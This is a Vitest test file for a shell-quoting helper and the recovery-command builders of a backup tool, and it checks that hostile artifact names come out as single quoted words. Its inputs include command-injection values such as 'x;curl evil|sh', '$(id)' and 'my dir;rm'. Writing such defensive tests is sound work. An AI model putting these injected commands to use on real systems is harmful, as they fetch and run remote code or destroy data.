/**
 * Issue #1202, the review of #1214: a command the page prints is a line an
 * operator pastes into a shell, and an artifact's name is whatever the source
 * host called the file. Every id that goes into a line goes through shellQuote,
 * so a hostile name is one inert word.
 */
import { describe, expect, it } from "vitest";
import {
  artifactCommand, artifactsInSetCommand, assuranceCancelCommand, recoverCommand, recoverManyCommand, recoverSetCommand,
  recoverToFileCommand, recoveryTestArtifactCommand, retryCommand, scrubCommand, shellQuote, showOutputCommand
} from "./assuranceCommands";

const HOSTILE = "production/pg/x;curl evil|sh";
const QUOTED = "'production/pg/x;curl evil|sh'";

describe("#1202 shellQuote", () => {
  it("leaves a plain id alone and quotes everything else", () => {
    expect(shellQuote("production/postgres-primary/dump.zst")).toBe("production/postgres-primary/dump.zst");
    expect(shellQuote("")).toBe("''");
    expect(shellQuote("a b")).toBe("'a b'");
    expect(shellQuote("it's")).toBe("'it'\\''s'");
    expect(shellQuote("$(id)")).toBe("'$(id)'");
    expect(shellQuote("a\nb")).toBe("'a\nb'");
  });
});

describe("#1202 a hostile artifact or set id is one quoted word in every echo", () => {
  it("#1202 the row menu's builders", () => {
    expect(retryCommand(HOSTILE)).toBe("retnd retry " + QUOTED);
    expect(artifactCommand(HOSTILE)).toBe("retnd artifacts " + QUOTED);
    expect(scrubCommand(HOSTILE)).toBe("retnd scrub " + QUOTED);
    expect(artifactsInSetCommand(HOSTILE)).toBe("retnd artifacts --backup-set " + QUOTED);
    expect(recoveryTestArtifactCommand(HOSTILE, "a/b/c d")).toBe("retnd recovery-test " + QUOTED + " --artifact 'a/b/c d'");
    expect(showOutputCommand(HOSTILE)).toBe("retnd recovery-test " + QUOTED + " --show-output");
    expect(assuranceCancelCommand("op;id")).toBe("retnd assurance cancel 'op;id'");
  });
  it("#1202 the recover builders", () => {
    expect(recoverCommand(HOSTILE, "staging", "", false)).toContain("retnd recover " + QUOTED + " ");
    expect(recoverCommand(HOSTILE, "download", "", false)).toContain("retnd recover " + QUOTED + " ");
    expect(recoverManyCommand([HOSTILE, "ok/a/b"], "staging", "", false)).toContain(QUOTED + " ok/a/b");
    expect(recoverSetCommand(HOSTILE, "all", "", "staging", "", false)).toContain("--set " + QUOTED);
    expect(recoverToFileCommand(HOSTILE, "x;y")).toBe("retnd recover " + QUOTED + " --to - > 'x;y'");
  });
  it("#1202 a staging name or medium id is quoted too, and a placeholder is not", () => {
    expect(recoverCommand("a/b/c", "staging", "my dir;rm", false)).toBe("retnd recover a/b/c --to 'my dir;rm'");
    expect(recoverCommand("a/b/c", "staging", "", false)).toBe("retnd recover a/b/c --to <name>");
    expect(recoverCommand("a/b/c", "storage", "m;1", false)).toBe("retnd recover a/b/c --to 'medium:m;1'");
    expect(recoverCommand("a/b/c", "storage", "", false)).toBe("retnd recover a/b/c --to medium:<id>");
  });
});
